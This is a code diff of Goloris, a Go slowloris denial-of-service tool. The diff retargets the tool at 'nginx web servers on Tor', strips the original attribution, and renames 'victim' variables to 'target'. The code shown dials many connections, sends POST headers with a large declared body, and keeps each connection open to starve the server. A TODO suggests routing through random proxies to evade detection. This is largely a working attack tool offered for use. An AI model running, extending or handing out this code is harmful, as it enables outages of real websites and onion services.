@@ -1,7 +1,5 @@
-// Goloris - slowloris[1] for nginx.
-//
-// The original source code is available at http://github.com/valyala/goloris.
-//
+// Goloris - slowloris targetting nginx web servers on Tor.
+
 package main
 
 import (
@@ -24,8 +22,8 @@ var (
 	rampUpInterval   = flag.Duration("rampUpInterval", time.Second, "Interval between new connections' acquisitions for a single dial worker (see dialWorkersCount)")
 	sleepInterval    = flag.Duration("sleepInterval", 10*time.Second, "Sleep interval between subsequent packets sending. Adjust to nginx's client_body_timeout")
 	testDuration     = flag.Duration("testDuration", time.Hour, "Test duration")
-	victimUrl        = flag.String("victimUrl", "http://127.0.0.1/", "Victim's url. Http POST must be allowed in nginx config for this url")
-	hostHeader        = flag.String("hostHeader", "", "Host header value in case it is different than the hostname in victimUrl")
+	targetUrl        = flag.String("targetUrl", "http://127.0.0.1/", "target's url. Http POST must be allowed in nginx config for this url")
+	hostHeader        = flag.String("hostHeader", "", "Host header value in case it is different than the hostname in targetUrl")
 )
 
 var (
@@ -45,42 +43,42 @@ func main() {
 
 	runtime.GOMAXPROCS(*goMaxProcs)
 
-	victimUri, err := url.Parse(*victimUrl)
+	targetUri, err := url.Parse(*targetUrl)
 	if err != nil {
-		log.Fatalf("Cannot parse victimUrl=[%s]: [%s]\n", victimUrl, err)
+		log.Fatalf("Cannot parse targetUrl=[%s]: [%s]\n", targetUrl, err)
 	}
-	victimHostPort := victimUri.Host
-	if !strings.Contains(victimHostPort, ":") {
+	targetHostPort := targetUri.Host
+	if !strings.Contains(targetHostPort, ":") {
 		port := "80"
-		if victimUri.Scheme == "https" {
+		if targetUri.Scheme == "https" {
 			port = "443"
 		}
-		victimHostPort = net.JoinHostPort(victimHostPort, port)
+		targetHostPort = net.JoinHostPort(targetHostPort, port)
 	}
-	host := victimUri.Host
+	host := targetUri.Host
 	if len(*hostHeader) > 0 {
 		host = *hostHeader
 	}
 	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n",
-		victimUri.RequestURI(), host, *contentLength))
+		targetUri.RequestURI(), host, *contentLength))
 
 	dialWorkersLaunchInterval := *rampUpInterval / time.Duration(*dialWorkersCount)
 	activeConnectionsCh := make(chan int, *dialWorkersCount)
 	go activeConnectionsCounter(activeConnectionsCh)
 	for i := 0; i < *dialWorkersCount; i++ {
-		go dialWorker(activeConnectionsCh, victimHostPort, victimUri, requestHeader)
+		go dialWorker(activeConnectionsCh, targetHostPort, targetUri, requestHeader)
 		time.Sleep(dialWorkersLaunchInterval)
 	}
 	time.Sleep(*testDuration)
 }
 
-func dialWorker(activeConnectionsCh chan<- int, victimHostPort string, victimUri *url.URL, requestHeader []byte) {
-	isTls := (victimUri.Scheme == "https")
+func dialWorker(activeConnectionsCh chan<- int, targetHostPort string, targetUri *url.URL, requestHeader []byte) {
+	isTls := (targetUri.Scheme == "https")
 	for {
 		time.Sleep(*rampUpInterval)
-		conn := dialVictim(victimHostPort, isTls)
+		conn := dialTarget(targetHostPort, isTls)
 		if conn != nil {
-			go doLoris(conn, victimUri, activeConnectionsCh, requestHeader)
+			go doLoris(conn, targetUri, activeConnectionsCh, requestHeader)
 		}
 	}
 }
@@ -93,8 +91,8 @@ func activeConnectionsCounter(ch <-chan int) {
 	}
 }
 
-func dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
-	// TODO hint: add support for dialing the victim via a random proxy
+func dialTarget(hostPort string, isTls bool) io.ReadWriteCloser {
+	// TODO hint: add support for dialing the target via a random proxy
 	// from the given pool.
 	conn, err := net.Dial("tcp", hostPort)
 	if err != nil {
@@ -124,7 +122,7 @@ func dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
 	return tlsConn
 }
 
-func doLoris(conn io.ReadWriteCloser, victimUri *url.URL, activeConnectionsCh chan<- int, requestHeader []byte) {
+func doLoris(conn io.ReadWriteCloser, targetUri *url.URL, activeConnectionsCh chan<- int, requestHeader []byte) {
 	defer conn.Close()
 
 	if _, err := conn.Write(requestHeader); err != nil {
